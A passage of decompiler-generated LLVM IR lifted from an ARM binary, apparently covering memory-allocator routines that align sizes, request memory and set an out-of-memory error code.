  %v2_142a8 = add i32 %v4_14294, 872
  %v3_142a8 = inttoptr i32 %v2_142a8 to i32*
  %v4_142a8 = load i32, i32* %v3_142a8, align 4
  store i32 %v4_142a8, i32* %r2.global-to-local, align 4
  %v1_142ac = load i32, i32* %r1.global-to-local, align 4
  %v2_142ac = load i32, i32* @r4, align 4
  %v3_142ac = sub i32 %v2_142ac, %v1_142ac
  %v3_142b0 = add i32 %v3_142ac, %v4_142a8
  store i32 %v3_142b0, i32* %r3.global-to-local, align 4
  store i32 %v3_142b0, i32* %v3_142a8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_142a4, %bb161
  %v0_142b8 = load i32, i32* @r4, align 4
  %v1_142b8 = urem i32 %v0_142b8, 8
  store i32 %v1_142b8, i32* %r3.global-to-local, align 4
  %v2_142b8 = icmp eq i32 %v1_142b8, 0
  br i1 %v2_142b8, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_142bc = sub nsw i32 8, %v1_142b8
  store i32 %v2_142bc, i32* %r3.global-to-local, align 4
  %v3_142c0 = add i32 %v2_142bc, %v0_142b8
  store i32 %v3_142c0, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_142c8 = phi i32 [ 0, %.thread43 ], [ %v2_142bc, %bb162 ]
  %v1_142c4 = load i32, i32* @r5, align 4
  %v2_142c4 = add i32 %v1_142c4, %v0_142b8
  store i32 %v2_142c4, i32* @r6, align 4
  %v1_142c8 = load i32, i32* @r8, align 4
  %v2_142c8 = add i32 %v2_142c4, %v0_142c8
  %v2_142cc = add i32 %v2_142c8, %v1_142c8
  store i32 %v2_142cc, i32* %r1.global-to-local, align 4
  %v1_142d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_142d0 = add i32 %v1_142d0, %v2_142cc
  %v1_142d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_142d4 = and i32 %v1_142d4, %v2_142d0
  store i32 %v2_142d4, i32* %r2.global-to-local, align 4
  %v2_142d8 = sub i32 0, %v2_142c4
  store i32 %v2_142d8, i32* %r3.global-to-local, align 4
  %v2_142dc = sub i32 %v2_142d4, %v2_142c4
  store i32 %v2_142dc, i32* @r5, align 4
  store i32 %v2_142dc, i32* %r0.global-to-local, align 4
  br i1 %v2_142b8, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_142b8, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_142e8 = call i32 @function_160fc(i32 %v2_142dc)
  store i32 %v1_142e8, i32* %r0.global-to-local, align 4
  %v3_142ec = icmp eq i32 %v1_142e8, -1
  br i1 %v3_142ec, label %dec_label_pc_142f4, label %dec_label_pc_14304

dec_label_pc_142f4:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_142f8 = call i32 @function_160fc(i32 0)
  store i32 %v1_142f8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1435c

dec_label_pc_14304:                               ; preds = %bb164
  %v1_14304 = load i32, i32* @r4, align 4
  %v3_14304 = icmp ult i32 %v1_142e8, %v1_14304
  br i1 %v3_14304, label %dec_label_pc_1430c, label %dec_label_pc_1435c

dec_label_pc_1430c:                               ; preds = %dec_label_pc_14304
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r0.global-to-local, align 4
  %v4_14314 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_14314, i32* %r2.global-to-local, align 4
  %v1_14318 = add i32 %v4_14314, 864
  %v2_14318 = inttoptr i32 %v1_14318 to i32*
  %v3_14318 = load i32, i32* %v2_14318, align 4
  %v0_1431c = load i32, i32* @r6, align 4
  store i32 %v0_1431c, i32* %r0.global-to-local, align 4
  %v1_14320 = and i32 %v3_14318, -2
  store i32 %v1_14320, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_14320, i32* %v2_14318, align 4
  br label %dec_label_pc_1435c

dec_label_pc_14330:                               ; preds = %.thread40
  %v0_14330 = load i32, i32* %r0.global-to-local, align 4
  %v3_14330 = icmp eq i32 %v0_14330, -1
  br i1 %v3_14330, label %dec_label_pc_14338, label %dec_label_pc_14354

dec_label_pc_14338:                               ; preds = %dec_label_pc_14330
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1433c = call i32 @function_160fc(i32 0)
  store i32 %v1_1433c, i32* %r0.global-to-local, align 4
  %v0_14340 = load i32, i32* @r7, align 4
  %v1_14340 = add i32 %v0_14340, 872
  %v2_14340 = inttoptr i32 %v1_14340 to i32*
  %v3_14340 = load i32, i32* %v2_14340, align 4
  store i32 %v3_14340, i32* %r2.global-to-local, align 4
  %v0_14344 = load i32, i32* @r4, align 4
  %v0_14348 = load i32, i32* @r5, align 4
  %v2_14344 = add i32 %v3_14340, %v1_1433c
  %v2_14348 = sub i32 %v2_14344, %v0_14344
  %v2_1434c = sub i32 %v2_14348, %v0_14348
  store i32 %v2_1434c, i32* %r3.global-to-local, align 4
  store i32 %v2_1434c, i32* %v2_14340, align 4
  %v0_14358.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14354

dec_label_pc_14354:                               ; preds = %dec_label_pc_14330, %dec_label_pc_14338
  %v0_14358 = phi i32 [ 0, %dec_label_pc_14330 ], [ %v0_14358.pre, %dec_label_pc_14338 ]
  %v0_14354 = load i32, i32* @r4, align 4
  store i32 %v0_14354, i32* @r7, align 4
  store i32 %v0_14358, i32* @r5, align 4
  br label %dec_label_pc_1435c

dec_label_pc_1435c:                               ; preds = %dec_label_pc_14304, %dec_label_pc_1430c, %dec_label_pc_142f4, %dec_label_pc_14354
  %v0_1435c = load i32, i32* %r0.global-to-local, align 4
  %v7_1435c = icmp eq i32 %v0_1435c, -1
  br i1 %v7_1435c, label %dec_label_pc_143e0, label %dec_label_pc_14364

dec_label_pc_14364:                               ; preds = %dec_label_pc_1435c
  %v1_14364 = load i32, i32* @r5, align 4
  %v2_14364 = add i32 %v1_14364, %v0_1435c
  %v0_14368 = load i32, i32* @r7, align 4
  %v2_14368 = sub i32 %v2_14364, %v0_14368
  %v1_1436c = or i32 %v2_14368, 1
  %v2_14370 = add i32 %v0_14368, 4
  %v3_14370 = inttoptr i32 %v2_14370 to i32*
  store i32 %v1_1436c, i32* %v3_14370, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_1437c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_1437c, i32* @r6, align 4
  %v1_14380 = add i32 %v4_1437c, 872
  %v2_14380 = inttoptr i32 %v1_14380 to i32*
  %v3_14380 = load i32, i32* %v2_14380, align 4
  %v0_14384 = load i32, i32* @r8, align 4
  %v2_14384 = icmp eq i32 %v0_14384, 0
  %v0_14388 = load i32, i32* @r5, align 4
  %v2_14388 = add i32 %v0_14388, %v3_14380
  store i32 %v2_14388, i32* %r3.global-to-local, align 4
  store i32 %v2_14388, i32* %v2_14380, align 4
  %v0_14390 = load i32, i32* @r7, align 4
  %v1_14390 = load i32, i32* @r6, align 4
  %v2_14390 = add i32 %v1_14390, 44
  %v3_14390 = inttoptr i32 %v2_14390 to i32*
  store i32 %v0_14390, i32* %v3_14390, align 4
  br i1 %v2_14384, label %dec_label_pc_143e0, label %dec_label_pc_14398

dec_label_pc_14398:                               ; preds = %dec_label_pc_14364
  %v0_1439c = load i32, i32* @r8, align 4
  %v1_1439c = add i32 %v0_1439c, -12
  %v1_143a0 = and i32 %v1_1439c, -8
  store i32 %v3_14168, i32* %ip.global-to-local, align 4
  %v2_143a8 = add i32 %v1_143a0, %v3_14168
  store i32 %v2_143a8, i32* %r1.global-to-local, align 4
  %v2_143ac = icmp ugt i32 %v1_143a0, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_143b4 = or i32 %v1_143a0, 1
  store i32 %v1_143b4, i32* %r3.global-to-local, align 4
  store i32 %v1_143b4, i32* %v2_14174, align 4
  %v0_143bc = load i32, i32* %r2.global-to-local, align 4
  %v1_143bc = load i32, i32* %r1.global-to-local, align 4
  %v2_143bc = add i32 %v1_143bc, 8
  %v3_143bc = inttoptr i32 %v2_143bc to i32*
  store i32 %v0_143bc, i32* %v3_143bc, align 4
  %v0_143c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_143c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_143c0 = add i32 %v1_143c0, 4
  %v3_143c0 = inttoptr i32 %v2_143c0 to i32*
  store i32 %v0_143c0, i32* %v3_143c0, align 4
  br i1 %v2_143ac, label %dec_label_pc_143c8, label %dec_label_pc_143e0

dec_label_pc_143c8:                               ; preds = %dec_label_pc_14398
  %v0_143c8 = load i32, i32* @r6, align 4
  %v1_143c8 = add i32 %v0_143c8, 836
  %v2_143c8 = inttoptr i32 %v1_143c8 to i32*
  %v3_143c8 = load i32, i32* %v2_143c8, align 4
  store i32 %v3_143c8, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_143d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_143d0 = add i32 %v0_143d0, 8
  store i32 %v1_143d0, i32* @r0, align 4
  store i32 -1, i32* %v2_143c8, align 4
  %v0_143d8 = call i32 @function_14bf4()
  store i32 %v0_143d8, i32* %r0.global-to-local, align 4
  %v0_143dc = load i32, i32* @r4, align 4
  %v1_143dc = load i32, i32* @r6, align 4
  %v2_143dc = add i32 %v1_143dc, 836
  %v3_143dc = inttoptr i32 %v2_143dc to i32*
  store i32 %v0_143dc, i32* %v3_143dc, align 4
  br label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %.thread34, %dec_label_pc_14398, %dec_label_pc_14364, %dec_label_pc_1435c, %dec_label_pc_143c8
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r0.global-to-local, align 4
  %v4_143e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_143e8, i32* %lr.global-to-local, align 4
  %v1_143ec = add i32 %v4_143e8, 872
  store i32 %v1_143ec, i32* %r1.global-to-local, align 4
  %v1_143f0 = inttoptr i32 %v1_143ec to i32*
  %v2_143f0 = load i32, i32* %v1_143f0, align 4
  store i32 %v2_143f0, i32* %r1.global-to-local, align 4
  %v3_143f0 = add i32 %v4_143e8, 876
  %v4_143f0 = inttoptr i32 %v3_143f0 to i32*
  %v5_143f0 = load i32, i32* %v4_143f0, align 4
  store i32 %v5_143f0, i32* %r3.global-to-local, align 4
  %v1_143f8 = add i32 %v4_143e8, 868
  %v2_143f8 = inttoptr i32 %v1_143f8 to i32*
  %v3_143f8 = load i32, i32* %v2_143f8, align 4
  store i32 %v3_143f8, i32* %r3.global-to-local, align 4
  %v1_143fc = add i32 %v4_143e8, 884
  %v2_143fc = inttoptr i32 %v1_143fc to i32*
  %v3_143fc = load i32, i32* %v2_143fc, align 4
  store i32 %v3_143fc, i32* %r2.global-to-local, align 4
  %v2_14400 = add i32 %v3_143f8, %v2_143f0
  store i32 %v2_14400, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_143f0, %v5_143f0
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_143e0
  store i32 %v2_143f0, i32* %v4_143f0, align 4
  %v0_14408.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_14408.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_143e0, %bb165
  %v1_14408 = phi i32 [ %v3_143fc, %dec_label_pc_143e0 ], [ %v1_14408.pre, %bb165 ]
  %v4_1440c = phi i32 [ %v2_14400, %dec_label_pc_143e0 ], [ %v0_14408.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_1440c, %v1_14408
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_1440c = load i32, i32* %lr.global-to-local, align 4
  %v6_1440c = add i32 %v5_1440c, 884
  %v7_1440c = inttoptr i32 %v6_1440c to i32*
  store i32 %v4_1440c, i32* %v7_1440c, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_14410 = load i32, i32* %lr.global-to-local, align 4
  %v1_14410 = add i32 %v0_14410, 44
  %v2_14410 = inttoptr i32 %v1_14410 to i32*
  %v3_14410 = load i32, i32* %v2_14410, align 4
  store i32 %v3_14410, i32* %ip.global-to-local, align 4
  %v1_14414 = add i32 %v3_14410, 4
  %v2_14414 = inttoptr i32 %v1_14414 to i32*
  %v3_14414 = load i32, i32* %v2_14414, align 4
  store i32 %v1_14028, i32* %r1.global-to-local, align 4
  %v1_1441c = and i32 %v3_14414, -4
  store i32 %v1_1441c, i32* %r3.global-to-local, align 4
  %v3_14420 = icmp ult i32 %v1_1441c, %v1_14028
  br i1 %v3_14420, label %dec_label_pc_1444c, label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %bb168
  %v0_14428 = load i32, i32* @sl, align 4
  %v2_14428 = sub i32 %v1_1441c, %v0_14428
  %v2_1442c = add i32 %v0_14428, %v3_14410
  store i32 %v2_1442c, i32* %r1.global-to-local, align 4
  %v1_14430 = or i32 %v2_14428, 1
  store i32 %v1_14430, i32* %r3.global-to-local, align 4
  %v1_14434 = or i32 %v0_14428, 1
  store i32 %v1_14434, i32* %r2.global-to-local, align 4
  %v1_14438 = add i32 %v3_14410, 8
  store i32 %v1_14438, i32* %r0.global-to-local, align 4
  store i32 %v1_14434, i32* %v2_14414, align 4
  %v0_14440 = load i32, i32* %r1.global-to-local, align 4
  %v1_14440 = load i32, i32* %lr.global-to-local, align 4
  %v2_14440 = add i32 %v1_14440, 44
  %v3_14440 = inttoptr i32 %v2_14440 to i32*
  store i32 %v0_14440, i32* %v3_14440, align 4
  %v0_14444 = load i32, i32* %r3.global-to-local, align 4
  %v1_14444 = load i32, i32* %r1.global-to-local, align 4
  %v2_14444 = add i32 %v1_14444, 4
  %v3_14444 = inttoptr i32 %v2_14444 to i32*
  store i32 %v0_14444, i32* %v3_14444, align 4
  br label %dec_label_pc_1445c

dec_label_pc_1444c:                               ; preds = %bb157, %bb168, %dec_label_pc_14228
  %v0_1444c = call i32 @function_13574()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14454 = inttoptr i32 %v0_1444c to i32*
  store i32 12, i32* %v2_14454, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1445c

dec_label_pc_1445c:                               ; preds = %bb151, %bb150, %dec_label_pc_14428, %dec_label_pc_14070, %dec_label_pc_1444c
  %v0_1445c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1445c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14460

dec_label_pc_14460:                               ; preds = %.thread1, %dec_label_pc_1403c, %.thread121, %dec_label_pc_13eac, %dec_label_pc_13ea0, %dec_label_pc_13d08, %dec_label_pc_13c8c, %dec_label_pc_1445c
  store i32 %v2_13bb4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  %v4_14470 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80820) to i32*), align 4
  store i32 %v4_14470, i32* @ip, align 4
  store i32 83068, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14470)
  br label %dec_label_pc_1447c

dec_label_pc_1447c:                               ; preds = %dec_label_pc_13bec, %dec_label_pc_14460
  %v0_1447c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1447c, i32* %r0.global-to-local, align 4
  store i32 %v3_13b88, i32* @r4, align 4
  store i32 %v6_13b88, i32* @r5, align 4
  store i32 %v9_13b88, i32* @r6, align 4
  store i32 %v12_13b88, i32* @r7, align 4
  store i32 %v15_13b88, i32* @r8, align 4
  store i32 %v18_13b88, i32* @sb, align 4
  store i32 %v21_13b88, i32* @sl, align 4
  store i32 %v24_13b88, i32* @fp, align 4
  store i32 %v27_13b88, i32* @lr, align 4
  ret i32 %v0_1447c

; uselistorder directives
  uselistorder i32 %v0_14428, { 1, 0, 2 }
  uselistorder i32 %v3_14410, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1440c, { 1, 0 }
  uselistorder i32 %v2_143f0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_143e8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_143a0, { 1, 2, 0 }
  uselistorder i32 %v0_14368, { 1, 0 }
  uselistorder i32 %v0_1435c, { 1, 0 }
  uselistorder i32 %v2_1434c, { 1, 0 }
  uselistorder i32 %v2_142dc, { 2, 1, 0 }
  uselistorder i32 %v2_142c4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_142bc, { 1, 0, 2 }
  uselistorder i32 %v1_142b8, { 2, 1, 0 }
  uselistorder i32 %v0_142b8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1429c, { 1, 0 }
  uselistorder i32 %v2_14274, { 1, 0 }
  uselistorder i32 %v3_14268, { 1, 0, 2 }
  uselistorder i32 %v2_14248, { 1, 0, 2 }
  uselistorder i32* %v2_14240, { 1, 0, 2 }
  uselistorder i32 %v0_14228, { 1, 0 }
  uselistorder i32 %v6_14204, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_141f0, { 2, 1, 0 }
  uselistorder i32 %v0_141d8, { 1, 0 }
  uselistorder i32 %v2_14194, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14190, { 1, 0 }
  uselistorder i32 %v3_14168, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_14148, { 1, 0, 2 }
  uselistorder i32 %v2_14130, { 1, 2, 0, 3 }
  uselistorder i32 %v1_140d8, { 2, 1, 0 }
  uselistorder i32 %v6_140cc, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_140a8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_14068, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14028, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_14020, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1401c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_14008, { 1, 0 }
  uselistorder i32 %v7_13fc8, { 1, 0 }
  uselistorder i32 %v4_13fc8, { 1, 0 }
  uselistorder i32 %v0_13f98, { 1, 0 }
  uselistorder i32 %v2_13f6c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_13f6854, { 1, 0 }
  uselistorder i32 %v1_13f34, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_13f1c., { 1, 2, 0 }
  uselistorder i32 %v0_13f24, { 0, 1, 3, 2 }
  uselistorder i32 %v1_13f24, { 1, 0 }
  uselistorder i32 %v3_13f04, { 1, 0 }
  uselistorder i32 %v4_13f00, { 1, 0, 2 }
  uselistorder i32 %v1_13e70, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13ec8, { 1, 0 }
  uselistorder i32 %v1_13eac, { 1, 0 }
  uselistorder i32 %v1_13d4c, { 1, 0 }
  uselistorder i32 %v0_13e8c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_13e54, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13ee8.pre, { 1, 2, 0 }
  uselistorder i32 %v0_13e30, { 2, 1, 0 }
  uselistorder i32 %v3_13e24, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_13d44, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_13dec, { 1, 0 }
  uselistorder i32 %v3_13de0, { 1, 0 }
  uselistorder i32 %v0_13dec, { 1, 0 }
  uselistorder i32 %v3_13dc4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13db4, { 1, 0, 2 }
  uselistorder i32 %v3_13d6c, { 2, 1, 0 }
  uselistorder i32 %v0_13d5c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13d2c, { 1, 0 }
  uselistorder i32 %v1_13ce0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13cdc, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_13c80, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_13c74, { 1, 0 }
  uselistorder i32 %v3_13c44, { 1, 0 }
  uselistorder i32 %v0_13c38, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_13c18, { 0, 2, 1, 3 }
  uselistorder i1 %v7_13c0c, { 1, 0 }
  uselistorder i32 %v0_13be4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 43, 40, 41, 42, 44, 45, 46, 47, 0, 1, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61, 57, 58, 59, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 81, 89, 76, 77, 78, 79, 80, 82, 83, 84, 85, 109, 86, 87, 88, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 27, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 57, 24, 23, 25, 0, 26, 28, 33, 29, 30, 1, 31, 32, 34, 35, 36, 39, 40, 37, 38, 45, 42, 41, 43, 44, 46, 56, 47, 48, 49, 50, 55, 51, 54, 53, 52 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_15e70, { 1, 0 }
  uselistorder i32 (i32)* @function_13b10, { 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), { 5, 6, 7, 8, 9, 4, 10, 3, 11, 0, 12, 13, 2, 14, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d514.554 to i32), { 2, 1, 3, 4, 0, 5, 6 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), { 23, 19, 17, 16, 18, 20, 21, 22, 15, 24, 10, 12, 11, 9, 8, 13, 14, 5, 4, 7, 6, 3, 2, 1, 0, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_1447c, { 1, 0 }
  uselistorder label %dec_label_pc_14460, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1445c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1444c, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_143e0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1435c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14354, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14228, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_1415c, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_14014, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_13f68, { 1, 0 }
  uselistorder label %dec_label_pc_13f70.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13f34, { 1, 0 }
  uselistorder label %dec_label_pc_13ee8, { 1, 0 }
  uselistorder label %dec_label_pc_13e7c, { 1, 0 }
  uselistorder label %dec_label_pc_13e78, { 1, 0 }
  uselistorder label %dec_label_pc_13e24, { 1, 0 }
  uselistorder label %dec_label_pc_13e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13dd8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13dc4, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_14490(i32 %arg1) local_unnamed_addr {
dec_label_pc_14490:
  %v0_14490 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14490, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_14490
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14490, %bb
  %v10_144a4 = phi i32 [ %arg1, %dec_label_pc_14490 ], [ 0, %bb ]
  ret i32 %v10_144a4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_144a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_144a8:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_144a8 = load i32, i32* @r4, align 4
  %v6_144a8 = load i32, i32* @r5, align 4
  %v9_144a8 = load i32, i32* @r6, align 4
  %v12_144a8 = load i32, i32* @lr, align 4
  %v2_144b0 = icmp eq i32 %arg1, 0
  store i32 135344, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_144c0 = mul i32 %arg2, %arg1
  store i32 %v2_144c0, i32* @r6, align 4
  br i1 %v2_144b0, label %dec_label_pc_144f0, label %dec_label_pc_144c8

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144a8
  store i32 %arg1, i32* @r1, align 4
  store i32 %v2_144c0, i32* @r0, align 4
  %v0_144d0 = call i32 @function_12a70()
  %v0_144d4 = load i32, i32* @r4, align 4
  %v9_144d4 = icmp eq i32 %v0_144d4, %v0_144d0
  br i1 %v9_144d4, label %dec_label_pc_144c8.dec_label_pc_144f0_crit_edge, label %dec_label_pc_144dc

dec_label_pc_144c8.dec_label_pc_144f0_crit_edge:  ; preds = %dec_label_pc_144c8
  %v0_144f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_144f0

dec_label_pc_144dc:                               ; preds = %dec_label_pc_144c8
  %v0_144dc = call i32 @function_13574()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_144e8 = inttoptr i32 %v0_144dc to i32*
  store i32 12, i32* %v2_144e8, align 4
  br label %dec_label_pc_145b4

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144c8.dec_label_pc_144f0_crit_edge, %dec_label_pc_144a8
  %v0_1450c = phi i32 [ %v0_144f4.pre, %dec_label_pc_144c8.dec_label_pc_144f0_crit_edge ], [ 135344, %dec_label_pc_144a8 ]
  %v2_144f4 = add i32 %v0_1450c, 68
  %v3_144f4 = inttoptr i32 %v2_144f4 to i32*
  %v4_144f4 = load i32, i32* %v3_144f4, align 4
  store i32 %v4_144f4, i32* @r4, align 4
  %v2_1450c = add i32 %v0_1450c, 72
  %v3_1450c = inttoptr i32 %v2_1450c to i32*
  %v4_1450c = load i32, i32* %v3_1450c, align 4
  store i32 %v4_1450c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1450c)
  %v0_14520 = load i32, i32* @r5, align 4
  %v2_14520 = add i32 %v0_14520, 16
  %v3_14520 = inttoptr i32 %v2_14520 to i32*
  %v4_14520 = load i32, i32* %v3_14520, align 4
  store i32 %v4_14520, i32* %ip.global-to-local, align 4
  store i32 83244, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14520)
  %v0_1452c = load i32, i32* @r6, align 4
  store i32 %v0_1452c, i32* @r0, align 4
  %v0_14530 = call i32 @function_13b88()
